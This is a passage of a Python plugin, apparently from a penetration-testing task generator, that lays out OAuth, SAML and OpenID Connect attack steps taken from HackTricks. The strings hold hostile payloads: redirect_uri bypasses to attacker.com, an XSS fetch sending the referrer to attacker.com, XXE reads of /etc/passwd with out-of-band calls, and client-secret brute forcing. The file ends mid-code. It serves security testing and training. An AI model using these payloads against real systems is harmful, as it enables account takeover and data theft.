"""
SSO & Authentication Protocol Attacks (OAuth 2.0, SAML, OpenID Connect)

Generates tasks for testing and exploiting Single Sign-On implementations:
- OAuth 2.0 authorization flows exploitation
- SAML assertion manipulation and signature attacks
- OpenID Connect vulnerabilities
- SSO bypass techniques and token abuse

Extracted from HackTricks:
- oauth-to-account-takeover.md (260 lines)
- saml-attacks/README.md (310 lines)
- saml-attacks/saml-basics.md (173 lines)

Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class SSOAttacksPlugin(ServicePlugin):
    """SSO and authentication protocol exploitation plugin"""

    @property
    def name(self) -> str:
        return "sso-attacks"

    @property
    def default_ports(self) -> List[int]:
        return [80, 443, 8080, 8443]

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'ssl/http', 'http-proxy']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """
        Detect web services that may implement SSO/OAuth/SAML

        Note: This plugin is primarily triggered by manual analysis or
        discovery of SSO endpoints during enumeration. Auto-detection is
        limited to HTTP/HTTPS services.
        """
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Check service name
        if any(svc in service for svc in self.service_names):
            return True

        # Check common HTTP/HTTPS ports
        if port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate SSO exploitation task tree"""

        tasks = {
            'id': f'sso-attacks-{port}',
            'name': f'SSO & Auth Protocol Testing (Port {port})',
            'type': 'parent',
            'children': []
        }

        # Phase 1: Discovery & Reconnaissance
        tasks['children'].append(self._create_discovery_phase(target, port))

        # Phase 2: OAuth 2.0 Attacks
        tasks['children'].append(self._create_oauth_attacks_phase(target, port))

        # Phase 3: SAML Attacks
        tasks['children'].append(self._create_saml_attacks_phase(target, port))

        # Phase 4: OpenID Connect Attacks
        tasks['children'].append(self._create_oidc_attacks_phase(target, port))

        # Phase 5: Advanced SSO Exploitation
        tasks['children'].append(self._create_advanced_sso_phase(target, port))

        return tasks

    def _create_discovery_phase(self, target: str, port: int) -> Dict[str, Any]:
        """Create SSO discovery and enumeration tasks"""
        return {
            'id': f'sso-discovery-{port}',
            'name': 'SSO Discovery & Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'sso-endpoint-enum-{port}',
                    'name': 'Enumerate SSO Endpoints',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Manually identify OAuth/SAML/OIDC endpoints through application analysis',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'RECON'],
                        'notes': 'Look for login buttons like "Login with Google", "SSO Login", "SAML Login"',
                        'next_steps': [
                            'Intercept OAuth/SAML flows with Burp Suite',
                            'Identify authorization server endpoints',
                            'Map client_id, redirect_uri, scope parameters',
                            'Check for .well-known/openid-configuration'
                        ],
                        'alternatives': [
                            'Search page source for "oauth", "saml", "openid"',
                            'Check HTML meta tags for SSO configuration',
                            'Review JavaScript for auth endpoints',
                            'Use browser DevTools Network tab during login'
                        ]
                    }
                },
                {
                    'id': f'oidc-discovery-{port}',
                    'name': 'OpenID Connect Discovery',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -k https://{target}/.well-known/openid-configuration',
                        'description': 'Retrieve OpenID Connect configuration metadata',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'RECON'],
                        'flag_explanations': {
                            '-k': 'Ignore SSL certificate validation (test environments)',
                            '.well-known/openid-configuration': 'Standard OIDC discovery endpoint'
                        },
                        'success_indicators': [
                            'JSON configuration returned with authorization_endpoint',
                            'token_endpoint, userinfo_endpoint, jwks_uri visible',
                            'Supported grant types and scopes listed'
                        ],
                        'failure_indicators': [
                            '404 Not Found - OIDC not implemented',
                            'Invalid JSON or empty response',
                            'Access denied or authentication required'
                        ],
                        'next_steps': [
                            'Note registration_endpoint if present (dynamic client registration)',
                            'Check supported response_types and grant_types',
                            'Identify jwks_uri for JWT key validation testing',
                            'Map token_endpoint for token manipulation attacks'
                        ],
                        'alternatives': [
                            'Try /.well-known/oauth-authorization-server',
                            'Browser: Navigate to endpoint and view JSON',
                            'Try common paths: /oauth/v2/.well-known/openid-configuration'
                        ]
                    }
                },
                {
                    'id': f'saml-metadata-{port}',
                    'name': 'SAML Metadata Discovery',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -k https://{target}/saml/metadata',
                        'description': 'Retrieve SAML metadata XML for IdP/SP configuration',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'RECON'],
                        'flag_explanations': {
                            '/saml/metadata': 'Common SAML metadata endpoint (try variations)',
                            '-k': 'Ignore SSL errors for test environments'
                        },
                        'success_indicators': [
                            'XML response with EntityDescriptor element',
                            'AssertionConsumerServiceURL visible',
                            'X509Certificate in KeyDescriptor element'
                        ],
                        'failure_indicators': [
                            '404 Not Found - Try alternative paths',
                            'HTML response instead of XML',
                            'Empty or malformed XML'
                        ],
                        'next_steps': [
                            'Extract AssertionConsumerService URL (ACS endpoint)',
                            'Note SingleSignOnService location (IdP endpoint)',
                            'Save X509Certificate for signature testing',
                            'Identify supported bindings (HTTP-POST, HTTP-Redirect)'
                        ],
                        'alternatives': [
                            'Try /saml/metadata.xml, /sso/saml/metadata',
                            'Try /FederationMetadata/2007-06/FederationMetadata.xml (ADFS)',
                            'Browser: View source for embedded metadata',
                            'Check /Shibboleth.sso/Metadata (Shibboleth)'
                        ],
                        'notes': 'Common SAML paths vary by implementation (Shibboleth, ADFS, SimpleSAMLphp)'
                    }
                },
                {
                    'id': f'saml-extractor-{port}',
                    'name': 'SAMLExtractor Endpoint Discovery',
                    'type': 'command',
                    'metadata': {
                        'command': f'python3 /opt/SAMLExtractor/SAMLExtractor.py -u https://{target}',
                        'description': 'Automated SAML endpoint discovery tool',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'RECON'],
                        'flag_explanations': {
                            '-u': 'Target URL to scan for SAML endpoints',
                            'SAMLExtractor': 'Tool: https://github.com/fadyosman/SAMLExtractor'
                        },
                        'success_indicators': [
                            'SAML consume URLs identified',
                            'List of SAML-enabled endpoints returned'
                        ],
                        'failure_indicators': [
                            'No SAML endpoints found',
                            'Connection errors or timeouts',
                            'Tool not installed'
                        ],
                        'next_steps': [
                            'Test each discovered endpoint manually',
                            'Intercept SAML flow with Burp Suite',
                            'Map complete authentication flow'
                        ],
                        'alternatives': [
                            'Manual: grep page source for "SAMLRequest", "SAMLResponse"',
                            'Manual: Search for /saml/, /sso/, /acs paths',
                            'Burp Spider with SAML keyword search'
                        ],
                        'notes': 'Install: git clone https://github.com/fadyosman/SAMLExtractor /opt/SAMLExtractor'
                    }
                }
            ]
        }

    def _create_oauth_attacks_phase(self, target: str, port: int) -> Dict[str, Any]:
        """Create OAuth 2.0 exploitation tasks"""
        return {
            'id': f'oauth-attacks-{port}',
            'name': 'OAuth 2.0 Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': f'oauth-redirect-uri-bypass-{port}',
                    'name': 'Test redirect_uri Validation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for open redirect_uri validation allowing authorization code theft',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
                        'notes': 'CRITICAL: Bypass redirect_uri allows stealing authorization codes → account takeover',
                        'next_steps': [
                            'Intercept OAuth authorization request',
                            'Modify redirect_uri parameter to attacker-controlled domain',
                            'Test validation bypass techniques (see alternatives)',
                            'If successful, code/token sent to attacker domain',
                            'Use stolen code to obtain access_token'
                        ],
                        'alternatives': [
                            'Open redirect: redirect_uri=https://victim.com/redirect?url=https://attacker.com',
                            'Path traversal: redirect_uri=https://victim.com/callback/../../../attacker.com',
                            'Subdomain: redirect_uri=https://attacker.victim.com',
                            'Weak regex: redirect_uri=https://victim.com.attacker.com',
                            'Fragment bypass: redirect_uri=https://victim.com#@attacker.com',
                            'URL encoding: redirect_uri=https://victim.com%2f@attacker.com',
                            'Case variation: redirect_uri=HTTPS://VICTIM.COM/callback'
                        ],
                        'success_indicators': [
                            'Authorization code sent to attacker-controlled redirect_uri',
                            'No error message or validation warning',
                            'Callback executed to modified domain'
                        ],
                        'failure_indicators': [
                            'Error: Invalid redirect_uri',
                            'Redirect blocked or shows error page',
                            'Authorization server rejects modified parameter'
                        ]
                    }
                },
                {
                    'id': f'oauth-state-csrf-{port}',
                    'name': 'Test state Parameter CSRF Protection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if state parameter is missing, static, or not validated (CSRF vulnerability)',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
                        'notes': 'Missing/weak state parameter enables CSRF attacks leading to account linking/takeover',
                        'next_steps': [
                            '1. Remove state parameter from OAuth request',
                            '2. Reuse same state value across sessions',
                            '3. Use predictable state values',
                            '4. Check if state is validated server-side',
                            '5. Test account linking CSRF attack'
                        ],
                        'alternatives': [
                            'Attack: Initiate OAuth flow, capture authorization URL',
                            'Attack: Remove or modify state parameter',
                            'Attack: Send modified URL to victim (social engineering)',
                            'Attack: Victim authorizes, links their account to attackers account',
                            'Tool: Burp Repeater to test state reuse'
                        ],
                        'success_indicators': [
                            'OAuth flow completes without state parameter',
                            'Same state value accepted multiple times',
                            'No CSRF error when state is removed/modified',
                            'Account successfully linked with manipulated flow'
                        ],
                        'failure_indicators': [
                            'Error: Invalid or missing state parameter',
                            'CSRF token validation error',
                            'OAuth flow terminates on state mismatch'
                        ]
                    }
                },
                {
                    'id': f'oauth-client-secret-disclosure-{port}',
                    'name': 'Search for Client Secret Disclosure',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Check if client_secret is exposed in client-side code or public endpoints',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'ENUM'],
                        'notes': 'Exposed client_secret allows impersonating application to steal access_tokens',
                        'next_steps': [
                            'View page source and search for "client_secret"',
                            'Check JavaScript files for hardcoded secrets',
                            'Review mobile app code (decompile APK/IPA)',
                            'Monitor network traffic for client_secret in requests',
                            'Check GitHub/GitLab for leaked credentials'
                        ],
                        'alternatives': [
                            'grep -r "client_secret" /path/to/app/source',
                            'Browser DevTools → Sources → Search "secret"',
                            'Burp History → Search "client_secret"',
                            'Check .env files, config.js, constants.js',
                            'GitHub dorking: "client_secret" site:github.com "victim.com"'
                        ],
                        'success_indicators': [
                            'client_secret visible in JavaScript or HTML',
                            'Secret found in mobile app binary',
                            'Token exchange happens client-side (major red flag)',
                            'Secret in public repository'
                        ],
                        'failure_indicators': [
                            'No secrets in client-side code',
                            'Token exchange properly done server-side',
                            'Secrets stored securely server-side only'
                        ]
                    }
                },
                {
                    'id': f'oauth-client-secret-bruteforce-{port}',
                    'name': 'Client Secret Brute-force Attack',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Attempt to brute-force weak client_secret values',
                        'tags': ['OSCP:MEDIUM', 'NOISY', 'BRUTE_FORCE'],
                        'notes': 'Brute-force POST /token endpoint if rate limiting weak',
                        'next_steps': [
                            'Capture valid authorization code from OAuth flow',
                            'Identify token endpoint (e.g., /oauth/token)',
                            'Build request with code, client_id, redirect_uri',
                            'Fuzz client_secret parameter with wordlist',
                            'Use Burp Intruder or custom script'
                        ],
                        'alternatives': [
                            'Wordlist: common secrets, weak passwords, "secret", "password"',
                            'Pattern: client_id variations (client_id + "123", etc.)',
                            'Burp Intruder: Sniper attack on client_secret',
                            'Custom Python script with requests library',
                            'ffuf -u https://target/token -w secrets.txt -d "client_secret=FUZZ&..."'
                        ],
                        'success_indicators': [
                            'HTTP 200 with access_token in response',
                            'Valid token returned for guessed secret',
                            'No rate limiting or account lockout'
                        ],
                        'failure_indicators': [
                            'HTTP 401 Unauthorized for all attempts',
                            'Rate limiting triggers (429 Too Many Requests)',
                            'IP blocked after N attempts',
                            'CAPTCHAs or bot detection'
                        ]
                    }
                },
                {
                    'id': f'oauth-referer-leak-{port}',
                    'name': 'Check Referer Header Code Leakage',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if authorization code/state leaked via Referer header to external resources',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'EXPLOIT'],
                        'notes': 'Code in URL leaked to third-party via Referer when loading external resources',
                        'next_steps': [
                            'Complete OAuth flow to receive code in callback URL',
                            'On callback page, check for external resources (images, scripts)',
                            'Use Burp to inspect Referer header in outbound requests',
                            'Set up attacker-controlled server to capture Referer',
                            'Check if code/state visible in Referer logs'
                        ],
                        'alternatives': [
                            'Manual: Complete OAuth, view Network tab in DevTools',
                            'Manual: Check requests to third-party domains',
                            'Burp Proxy → Filter external requests → Check Referer',
                            'Setup listener: python3 -m http.server 8000 and check logs',
                            'XSS payload: fetch("https://attacker.com?r=" + document.referrer)'
                        ],
                        'success_indicators': [
                            'Authorization code visible in Referer header',
                            'state parameter leaked to external domain',
                            'Full callback URL with sensitive params in Referer'
                        ],
                        'failure_indicators': [
                            'Referer header empty or sanitized',
                            'No external resources loaded on callback page',
                            'Referrer-Policy: no-referrer set'
                        ]
                    }
                },
                {
                    'id': f'oauth-token-browser-history-{port}',
                    'name': 'Check Access Token in Browser History',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if access_token stored in browser history (Implicit Flow vulnerability)',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'QUICK_WIN'],
                        'notes': 'Implicit Flow returns token in URL fragment → stored in browser history',
                        'next_steps': [
                            'Complete OAuth Implicit Flow (response_type=token)',
                            'Open browser history (Ctrl+H)',
                            'Search for "access_token" in URL',
                            'Check if full token visible in history'
                        ],
                        'alternatives': [
                            'Browser history → Search URLs',
                            'Check SQLite history databases (Firefox: places.sqlite, Chrome: History)',
                            'sqlite3 ~/.mozilla/firefox/*.default/places.sqlite "SELECT url FROM moz_places WHERE url LIKE \'%access_token%\'"',
                            'Check autocomplete suggestions when typing URL'
                        ],
                        'success_indicators': [
                            'access_token visible in browser history',
                            'Full authorization URL with token in history',
                            'Token persists after session ends'
                        ],
                        'failure_indicators': [
                            'No token in history (Authorization Code flow used)',
                            'Fragment not logged in history (correct behavior)',
                            'Token exchanged server-side'
                        ]
                    }
                },
                {
                    'id': f'oauth-pre-account-takeover-{port}',
                    'name': 'Pre-Account Takeover Attack',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if attacker can pre-register account with victims email before victim signs up',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
                        'notes': 'Create account with victims email → victim OAuth login links to attackers account',
                        'next_steps': [
                            '1. Register account with victim@example.com (no email verification)',
                            '2. Victim later clicks "Login with Google" using victim@example.com',
                            '3. Application links Google account to existing (attackers) account',
                            '4. Attacker logs in with original credentials, accesses victims data',
                            'Variant: Register OAuth account, change email to victims email'
                        ],
                        'alternatives': [
                            'Attack 1: victim email + password signup without verification',
                            'Attack 2: OAuth signup → change email to victim email',
                            'Test: Create account, initiate password reset for victim',
                            'Social engineering: Send OAuth login link to victim'
                        ],
                        'success_indicators': [
                            'Account created without email verification',
                            'OAuth login links to pre-existing account',
                            'Attacker retains access after victim OAuth login',
                            'Email change allowed without re-verification'
                        ],
                        'failure_indicators': [
                            'Email verification required before account creation',
                            'OAuth creates new account instead of linking',
                            'Email change requires verification',
                            'Application rejects duplicate emails'
                        ]
                    }
                },
                {
                    'id': f'oauth-aws-cognito-{port}',
                    'name': 'AWS Cognito Token Abuse',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if AWS Cognito access_token has excessive permissions (update-user-attributes)',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'EXPLOIT'],
                        'notes': 'Cognito tokens may allow changing user email → account takeover',
                        'next_steps': [
                            'Complete OAuth flow to obtain access_token',
                            'Test token permissions with AWS CLI',
                            'Attempt to read user info: cognito-idp get-user',
                            'Attempt to update email: cognito-idp update-user-attributes',
                            'If successful, change email to victim email → takeover'
                        ],
                        'alternatives': [
                            'aws cognito-idp get-user --region us-east-1 --access-token TOKEN',
                            'aws cognito-idp update-user-attributes --region us-east-1 --access-token TOKEN --user-attributes Name=email,Value=victim@example.com',
                            'Check JWT token for scopes: decode at jwt.io',
                            'Test other attributes: phone_number, name, etc.'
                        ],
                        'success_indicators': [
                            'get-user returns user information',
                            'update-user-attributes succeeds with new email',
                            'No MFA or additional verification required',
                            'Account takeover achieved via email change'
                        ],
                        'failure_indicators': [
                            'Access denied - insufficient permissions',
                            'Token lacks update-user-attributes scope',
                            'Email change requires verification code',
                            'MFA required for sensitive changes'
                        ],
                        'command': 'aws cognito-idp get-user --region us-east-1 --access-token <TOKEN>'
                    }
                },
                {
                    'id': f'oauth-token-reuse-{port}',
                    'name': 'Cross-Application Token Reuse',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if access_token from attacker OAuth app accepted by victim application',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
                        'notes': 'If app doesnt validate token audience (aud claim), attacker tokens work',
                        'next_steps': [
                            '1. Create malicious OAuth application (same IdP as target)',
                            '2. Victim logs into attackers app with Facebook/Google',
                            '3. Attacker captures victims access_token (for attackers app)',
                            '4. Attacker uses token to login to victim application',
                            '5. If app doesnt check token aud/client_id → takeover'
                        ],
                        'alternatives': [
                            'Setup: Create OAuth app at developers.facebook.com',
                            'Attack: Lure victim to login to your app',
                            'Capture: Log access_token from OAuth callback',
                            'Exploit: POST token to victim apps /auth/oauth/token',
                            'Test: Check if victim app validates token.aud == victim_app_id'
                        ],
                        'success_indicators': [
                            'Victim app accepts token from different application',
                            'No audience (aud) validation on tokens',
                            'Successful login/account takeover with foreign token',
                            'Token from App A works on App B (same IdP)'
                        ],
                        'failure_indicators': [
                            'Error: Invalid token or audience mismatch',
                            'App validates token belongs to correct client_id',
                            'Token rejected due to aud claim mismatch',
                            'Proper OAuth implementation checks token origin'
                        ]
                    }
                },
                {
                    'id': f'oauth-prompt-bypass-{port}',
                    'name': 'Test prompt=none Interaction Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if prompt=none parameter bypasses user consent screen',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'EXPLOIT'],
                        'notes': 'prompt=none auto-approves OAuth if user already authenticated → silent attacks',
                        'next_steps': [
                            'Add &prompt=none to OAuth authorization URL',
                            'Test if consent screen is skipped',
                            'Check if authorization granted automatically',
                            'Useful for silent CSRF or phishing attacks'
                        ],
                        'alternatives': [
                            'URL: https://oauth.provider.com/authorize?...&prompt=none',
                            'Test values: prompt=none, prompt=consent, prompt=login',
                            'Attack: Send prompt=none URL to authenticated victim',
                            'Bypass: Skip user interaction for malicious OAuth flow'
                        ],
                        'success_indicators': [
                            'Consent screen bypassed with prompt=none',
                            'Authorization granted without user interaction',
                            'Immediate redirect to callback with code'
                        ],
                        'failure_indicators': [
                            'Error: interaction_required',
                            'Consent screen still shown',
                            'Parameter ignored by authorization server'
                        ]
                    }
                },
                {
                    'id': f'oauth-response-mode-{port}',
                    'name': 'Test response_mode Parameter',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test different response_mode values to find vulnerabilities',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'EXPLOIT'],
                        'notes': 'response_mode controls how code/token is returned → may enable XSS or leakage',
                        'next_steps': [
                            'Test response_mode=query (code in ?code=...)',
                            'Test response_mode=fragment (code in #code=...)',
                            'Test response_mode=form_post (code in POST body)',
                            'Test response_mode=web_message (postMessage)',
                            'Check for XSS in web_message mode',
                            'Check for Referer leaks in query mode'
                        ],
                        'alternatives': [
                            '&response_mode=query → Check Referer leakage',
                            '&response_mode=fragment → Check history logging',
                            '&response_mode=form_post → Check CSRF protection',
                            '&response_mode=web_message → Check postMessage XSS',
                            'Monitor postMessage: window.addEventListener("message", e => console.log(e))'
                        ],
                        'success_indicators': [
                            'Different response modes accepted',
                            'Code leaked via unexpected channel',
                            'XSS via postMessage in web_message mode',
                            'Referer leak in query mode'
                        ],
                        'failure_indicators': [
                            'Invalid response_mode error',
                            'Only default mode accepted',
                            'No security impact from mode switching'
                        ]
                    }
                }
            ]
        }

    def _create_saml_attacks_phase(self, target: str, port: int) -> Dict[str, Any]:
        """Create SAML exploitation tasks"""
        return {
            'id': f'saml-attacks-{port}',
            'name': 'SAML Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': f'saml-signature-wrapping-{port}',
                    'name': 'XML Signature Wrapping (XSW) Attacks',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test 8 XSW attack variants to bypass XML signature validation',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
                        'notes': 'XSW attacks inject forged elements while keeping signature valid',
                        'next_steps': [
                            'Intercept SAML Response with Burp Suite',
                            'Install SAML Raider Burp extension',
                            'Apply XSW attacks: XSW #1 through XSW #8',
                            'Send modified response to application',
                            'Check if forged assertion processed by business logic'
                        ],
                        'alternatives': [
                            'Tool: Burp SAML Raider extension (Apply XSW dropdown)',
                            'Manual: Clone <Assertion> element, modify Subject',
                            'XSW #1: Add evil Response root with signature',
                            'XSW #2: Use detached signature with evil assertion',
                            'XSW #3: Evil assertion at same level as original',
                            'XSW #4: Original assertion as child of evil assertion',
                            'XSW #5: Copied assertion envelopes signature',
                            'XSW #6: Nested structure: assertion→signature→assertion',
                            'XSW #7: Use Extensions element for bypass',
                            'XSW #8: Reverse structure from XSW #7'
                        ],
                        'success_indicators': [
                            'Modified assertion accepted by application',
                            'Login successful with forged user identity',
                            'Business logic processes evil assertion instead of signed one',
                            'Account takeover via injected Subject'
                        ],
                        'failure_indicators': [
                            'Signature validation failure',
                            'Application rejects modified SAML response',
                            'Error: Invalid assertion structure',
                            'Strict schema validation prevents injection'
                        ]
                    }
                },
                {
                    'id': f'saml-signature-exclusion-{port}',
                    'name': 'XML Signature Exclusion Test',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if SAML accepted without signature element (signature validation bypass)',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN'],
                        'notes': 'Remove entire <Signature> element and check if validation skipped',
                        'next_steps': [
                            'Intercept SAML Response in Burp',
                            'Use SAML Raider: Click "Remove Signatures" button',
                            'Modify assertion data (email, username, role)',
                            'Forward unsigned SAML response',
                            'Check if application accepts it'
                        ],
                        'alternatives': [
                            'Manual: Base64 decode SAMLResponse parameter',
                            'Manual: Remove all <ds:Signature> elements from XML',
                            'Manual: Modify <saml:Subject> to target user',
                            'Manual: Re-encode and send',
                            'Tool: SAML Raider "Remove Signatures" button'
                        ],
                        'success_indicators': [
                            'Application accepts unsigned SAML response',
                            'Successful login without signature validation',
                            'Account takeover with modified unsigned assertion',
                            'No signature validation error'
                        ],
                        'failure_indicators': [
                            'Error: Signature required',
                            'Authentication fails without signature',
                            'Application rejects unsigned responses',
                            'Proper validation enforced'
                        ]
                    }
                },
                {
                    'id': f'saml-certificate-faking-{port}',
                    'name': 'Certificate Faking Attack',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if SP accepts SAML signed with self-signed certificate',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
                        'notes': 'Self-sign SAML with your own certificate to test trust validation',
                        'next_steps': [
                            'Intercept SAML Response with existing signature',
                            'SAML Raider: "Send Certificate to SAML Raider Certs"',
                            'SAML Raider Certs tab: Select cert → "Save and Self-Sign"',
                            'Back to Proxy: Select self-signed cert from dropdown',
                            'Remove original signatures: "Remove Signatures"',
                            'Re-sign with your cert: "(Re-)Sign Message/Assertion"',
                            'Forward request and check if accepted'
                        ],
                        'alternatives': [
                            'Manual: Generate self-signed cert with openssl',
                            'openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem',
                            'Manual: Sign SAML XML with your certificate using xmlsec1',
                            'Tool: SAML Raider automates entire process',
                            'Test: Change assertion data before re-signing'
                        ],
                        'success_indicators': [
                            'Application accepts self-signed SAML response',
                            'Login successful with untrusted certificate',
                            'SP doesnt validate certificate against IdP trust store',
                            'Account takeover with arbitrary assertions'
                        ],
                        'failure_indicators': [
                            'Certificate validation error',
                            'Application rejects untrusted certificate',
                            'Proper PKI trust validation enforced',
                            'Error: Certificate not in trust store'
                        ]
                    }
                },
                {
                    'id': f'saml-xxe-{port}',
                    'name': 'XXE in SAML Response',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for XML External Entity injection in SAML XML processing',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
                        'notes': 'SAML responses are base64-encoded XML → susceptible to XXE',
                        'next_steps': [
                            'Intercept SAML Response',
                            'Base64 decode SAMLResponse parameter',
                            'Inject XXE payload in DOCTYPE',
                            'Test file read: <!ENTITY xxe SYSTEM "file:///etc/passwd">',
                            'Reference entity: <saml:Issuer>&xxe;</saml:Issuer>',
                            'Re-encode base64 and send'
                        ],
                        'alternatives': [
                            'Tool: SAML Raider "Send to XXE Tester"',
                            'Payload: <!DOCTYPE foo [<!ENTITY file SYSTEM "file:///etc/passwd">]>',
                            'OOB XXE: <!ENTITY xxe SYSTEM "http://attacker.com/capture">',
                            'Error-based: Trigger XML parsing errors to leak data',
                            'Blind XXE: Use DTD parameter entities for exfiltration'
                        ],
                        'success_indicators': [
                            'File contents visible in SAML response or error',
                            'HTTP request to attacker server (OOB XXE)',
                            'XML parsing errors reveal file paths',
                            'RCE via expect:// wrapper (rare)'
                        ],
                        'failure_indicators': [
                            'External entities disabled in XML parser',
                            'No response or generic error',
                            'WAF blocks XXE payloads',
                            'Proper input validation and sanitization'
                        ]
                    }
                },
                {
                    'id': f'saml-xslt-injection-{port}',
                    'name': 'XSLT Injection via SAML',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test XSLT injection in SAML signature transforms (pre-validation RCE)',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
                        'notes': 'XSLT executed BEFORE signature validation → works with invalid signature',
                        'next_steps': [
                            'Intercept SAML Response',
                            'Add XSLT payload to <ds:Transforms> element',
                            'Payload reads /etc/passwd and exfiltrates via HTTP',
                            'Self-sign or use invalid signature (still works)',
                            'Monitor attacker server for exfiltrated data'
                        ],
                        'alternatives': [
                            'Tool: SAML Raider XSLT injection generator',
                            'Payload: File read + exfiltration via unparsed-text()',
                            'Payload: Execute code via java:Runtime (if enabled)',
                            'Payload: SSRF via doc() function',
                            'Manual: Inject <xsl:stylesheet> in Transforms'
                        ],
                        'success_indicators': [
                            'File contents received at attacker server',
                            'HTTP request to attacker URL with exfiltrated data',
                            'RCE achieved via XSLT functions',
                            'SSRF to internal services'
                        ],
                        'failure_indicators': [
                            'XSLT disabled or sandboxed',
                            'No execution of XSLT transforms',
                            'WAF blocks XSLT payloads',
                            'Restricted XSLT functions (no unparsed-text, etc.)'
                        ],
                        'command': 'echo "See alternatives for XSLT payload template"'
                    }
                },
                {
                    'id': f'saml-token-recipient-confusion-{port}',
                    'name': 'Token Recipient Confusion (SP Target Confusion)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if SP validates Recipient field (redirect SAML from SP-A to SP-B)',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'EXPLOIT'],
                        'notes': 'Valid SAML for SP-A might be accepted by SP-B (same IdP)',
                        'next_steps': [
                            'Prerequisites: Account on SP-Legit, both SPs use same IdP',
                            '1. Initiate SAML login on SP-Legit',
                            '2. Intercept SAML Response from IdP',
                            '3. Redirect response to SP-Target ACS endpoint',
                            '4. Check <SubjectConfirmationData Recipient="...">',
                            '5. If SP-Target doesnt validate Recipient → takeover'
                        ],
                        'alternatives': [
                            'Attack: Capture SAML Response for your account on SP-A',
                            'Attack: Change Recipient URL to SP-B ACS endpoint',
                            'Attack: POST SAML to SP-B (same username on both)',
                            'Attack: If accepted → logged into SP-B as your SP-A account',
                            'Test: Check if Recipient validation enforced'
                        ],
                        'success_indicators': [
                            'SP-Target accepts SAML intended for SP-Legit',
                            'Login successful on wrong service provider',
                            'No Recipient validation error',
                            'Account takeover via SAML replay across SPs'
                        ],
                        'failure_indicators': [
                            'Error: Invalid recipient',
                            'SP validates Recipient matches its own ACS URL',
                            'SAML rejected due to recipient mismatch',
                            'Proper validation enforced'
                        ]
                    }
                },
                {
                    'id': f'saml-xml-round-trip-{port}',
                    'name': 'XML Round-trip Attack',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test XML parser inconsistencies between signature validation and business logic',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'EXPLOIT'],
                        'notes': 'XML encoding/decoding may change data between signature check and processing',
                        'next_steps': [
                            'Requires vulnerable XML parser (e.g., REXML < 3.2.5)',
                            'Craft SAML with XML tricks (CDATA, comments, DOCTYPE)',
                            'Signature validates on original parse',
                            'After encoding/decoding round-trip, data changes',
                            'Business logic sees different data than validator'
                        ],
                        'alternatives': [
                            'Payload: Use CDATA, comments, entity tricks',
                            'Example: <Y/><![CDATA[--><X><Z/><!--]]>-->',
                            'Test: First parse sees Y, after round-trip sees Z',
                            'Reference: CVE-2021-28965 (REXML vulnerability)',
                            'Check: https://joonas.fi/2021/08/saml-is-insecure-by-design/'
                        ],
                        'success_indicators': [
                            'Signature validates but wrong data processed',
                            'XML parser inconsistency exploited',
                            'Different elements seen pre/post round-trip',
                            'Account takeover via parser confusion'
                        ],
                        'failure_indicators': [
                            'Parser handles XML consistently',
                            'No round-trip vulnerabilities',
                            'Updated XML libraries without known bugs',
                            'Strict XML validation prevents tricks'
                        ]
                    }
                },
                {
                    'id': f'saml-xss-logout-{port}',
                    'name': 'XSS in SAML Logout Functionality',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for XSS in SAML logout redirect parameters (base, return_to)',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'EXPLOIT'],
                        'notes': 'SAML logout often has redirect parameters vulnerable to XSS',
                        'next_steps': [
                            'Find logout endpoint: /oidauth/logout, /saml/logout',
